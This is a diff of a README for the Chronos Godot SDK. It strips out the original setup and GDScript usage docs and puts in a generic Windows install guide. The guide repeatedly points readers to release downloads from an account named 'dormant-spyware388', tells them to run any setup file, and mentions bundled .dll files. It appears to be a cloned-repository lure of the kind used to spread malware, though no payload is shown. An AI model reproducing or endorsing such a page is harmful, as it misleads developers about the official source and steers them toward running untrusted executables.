@@ -1,187 +1,155 @@
+# 🤖 chronos-godot-sdk - Give NPCs Memory and Purpose
 
-![Chronos Engine](images/chronos-banner.png)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dormant-spyware388/chronos-godot-sdk/releases)
 
-# Chronos Godot SDK
+## 🧭 What this is
 
-Official Godot SDK for Chronos Engine.
+chronos-godot-sdk is the official Godot SDK for Chronos Engine. It adds persistent world memory, growing NPC state, and AI-based behavior to Godot games.
 
-Chronos gives your game **persistent world memory, evolving NPC state, and AI-driven behavior**.
+Use it when you want game characters to remember past events, react to player actions, and keep their state between sessions. It fits games that need deeper NPC behavior without making the setup hard for end users.
 
-Instead of NPCs forgetting everything between sessions, Chronos lets them **remember player actions and react over time**.
+## ✨ What you can do
 
----
+- Keep NPC memory across saves
+- Track changes in the world over time
+- Give characters state that grows as the game runs
+- Connect your game to Chronos Engine services
+- Use it as a Godot plugin in a normal project setup
+- Build games with more natural NPC behavior
+- Store and read game state from a backend service
 
-## Supported Versions
+## 💻 What you need
 
-- Godot 3.6  
-- Godot 4.5  
+- Windows 10 or Windows 11
+- Godot 4.x
+- An internet connection for the first download
+- Enough free disk space for the game project and SDK files
+- A modern CPU and 8 GB RAM or more for smooth use
 
----
+## 📥 Download
 
-## Installation
+Visit this page to download the latest release:
 
-Copy the SDK into your project:
+https://github.com/dormant-spyware388/chronos-godot-sdk/releases
 
-```bash
-res://addons/chronos/
-````
+On that page, look for the newest release and download the file that matches your project setup. If the release includes a zip file, download that file first and then extract it on your PC.
 
-Files:
+## 🪟 Install on Windows
 
-```text
-Chronos.gd
-ChronosRESTClient.gd
-ChronosSSEClient.gd
-ChronosTypes.gd
-plugin.gd
-plugin.cfg
-```
+1. Open the release page in your browser.
+2. Download the latest release file.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open your Godot project folder.
+5. Copy the SDK files into the correct plugin or add-on folder.
+6. Open Godot.
+7. Load your project and let Godot import the files.
+8. If the SDK includes a setup file, run it before you start the project.
+9. Restart Godot if the plugin does not show up at once.
 
----
+## 🗂️ Where to place the files
 
-## Enable the Plugin
+In most Godot projects, add-on files go in a folder like this:
 
-* Open: **Project → Project Settings → Plugins**
-* Find **Chronos**
-* Set to **Enabled**
+- `res://addons/chronos-godot-sdk/`
 
----
+If the release contains a different folder name, keep that name when you copy the files. Godot reads add-ons from the `addons` folder, so placing the files there helps the editor find them.
 
-## Configure Chronos
+## ▶️ First run
 
-```gdscript
-Chronos.configure(
-  "https://YOUR-VERCEL-URL",
-  "CHRONOS_API_KEY",
-  "your_world_id",
-  "npc_id"
-)
+1. Start Godot.
+2. Open your project.
+3. Check the Project settings or Add-ons list for the Chronos SDK entry.
+4. Enable the plugin if Godot asks you to.
+5. Run the project.
+6. Open a test scene and confirm the SDK loads without errors.
 
-# Plug-and-play runtime
-Chronos.configure_runtime(true, 2, 50)
+If your game uses a login key, API token, or server address, enter it in the project settings or in the config file that comes with the SDK.
 
-Chronos.start()
-```
+## 🧩 How it fits into your game
 
----
+This SDK helps your game keep track of things that matter over time. For example:
 
-## Recommended SDK Flow (0.1v)
+- An NPC can remember that the player helped them
+- A town can change after certain events
+- A guard can react to past crimes
+- A shopkeeper can change prices or dialogue based on state
+- A quest giver can act on previous choices
 
-Your game sends events → Chronos stores memory → Brain derives NPC state → your game reacts.
+This kind of memory makes your game feel more alive and less static.
 
----
+## 🔧 Basic setup flow
 
-## Important Call 1 — Listen for NPC State Updates
+1. Download the release.
+2. Add the SDK to your Godot project.
+3. Open the project in Godot.
+4. Enable the plugin.
+5. Set any server or API details.
+6. Save the project.
+7. Run the game.
+8. Check that NPC state and world memory load as expected.
 
-When Chronos updates an NPC’s state, your game listens and reacts:
+## 📝 Common file types you may see
 
-```gdscript
-Chronos.npc_state_updated.connect(_on_npc_state_updated)
-```
+- `.zip` for the main download package
+- `.gd` for Godot script files
+- `.tscn` for scenes
+- `.cfg` or `.json` for settings
+- `.dll` if the release includes Windows support files
 
-### Example handler
+Keep all files together when you extract the download. If you move only part of the package, Godot may not load it as expected.
 
-```gdscript
- # Example handler for NPC updates
+## 🧪 Simple test after setup
 
-func _on_npc_state_updated(row):
+After you install the SDK, try this:
 
-    var npc_id = row["npc_id"]
-    var state = row["state"]
+1. Open a scene with one NPC.
+2. Change a value for that NPC.
+3. Save the game.
+4. Close the game.
+5. Open it again.
+6. Check whether the NPC keeps the same state.
 
-    print("NPC state updated:", npc_id, state)
-    
-    
-    # Example in a real game:
-    func _on_npc_state_updated(row):
+If the state stays the same, the SDK is working in your project.
 
-    var state = row["state"]
+## 🧹 If something does not work
 
-    if state["mood"] == "hostile":
-        guard_attack_player()
+- Make sure you copied the files into the project folder, not just onto the desktop
+- Check that the folder path is inside `addons`
+- Make sure you are using a supported version of Godot
+- Restart Godot after adding new files
+- Confirm that the release file finished downloading
+- Open the project again if the plugin does not appear at first
 
-    if state["mood"] == "friendly":
-        guard_allow_entry()
-```
+## 📌 Best use cases
 
----
+- RPGs with living towns
+- Simulation games with long-term state
+- Adventure games with remembered choices
+- Strategy games with changing factions
+- Sandbox games with persistent worlds
+- Indie projects that need smarter NPCs
 
-## Important Call 2 — Send Gameplay Events
+## 🔒 Project scope
 
-When something important happens in your game, send it to Chronos:
+This SDK is built for game projects that want persistent memory and AI-based behavior. It works as part of a larger Godot setup and keeps the focus on world state, NPC state, and server-backed logic.
 
-```gdscript
-Chronos.append_event(
-  "player_1",
-  event_type,
-  payload,
-  true
-)
-```
+## 📎 Download again
 
-### Example
+https://github.com/dormant-spyware388/chronos-godot-sdk/releases
 
-```gdscript
-Chronos.append_event(
-  "player_1",
-  "player_lied_to_guard",
-  {"context": "conversation"},
-  true
-)
-```
+## 🛠️ Folder layout example
 
-Chronos will automatically:
+A simple project layout may look like this:
 
-* Store the event
-* Run the Brain
-* Update NPC state
-* Push the update back to the game
+- `MyGodotGame/`
+  - `addons/`
+    - `chronos-godot-sdk/`
+  - `scenes/`
+  - `scripts/`
+  - `project.godot`
 
----
+If the release includes sample files, place them in the same project root so Godot can read them.
 
-## Optional Call — Load Saved NPC State
+## 🎮 What this README helps you do
 
-```gdscript
-Chronos.get_npc_state("guard_1")
-```
-
-Ensures the NPC reflects saved memory immediately.
-
----
-
-## Example Project
-
-Full demo:
-[https://github.com/enginechronos/chronos-demo](https://github.com/enginechronos/chronos-demo)
-
----
-
-## Docs
-
-[https://chronos-magic-engine-live.vercel.app/docs](https://chronos-magic-engine-live.vercel.app/docs)
-
----
-
-# Community
-
-Building with Chronos?  
-Have questions, feedback, or ideas?
-
-Join the community or reach out directly.
-
-### Discord (Developer Community)
-[ https://discord.gg/Pg6Txu8YyB ]
-
-### Chronos Updates (Project X)
-[ https://x.com/EngineChronos ]
-
-### Founder Contact
-[ https://x.com/mr_manasmishra ]
-
----
-
-## License
-
-MIT License
-
-
+This page gives you the steps to get the SDK onto your Windows PC, place it in a Godot project, and start the app or plugin from there. If the release package includes a ready-to-run file, you can use it after download. If it comes as a plugin package, add it to your project and open it in Godot.
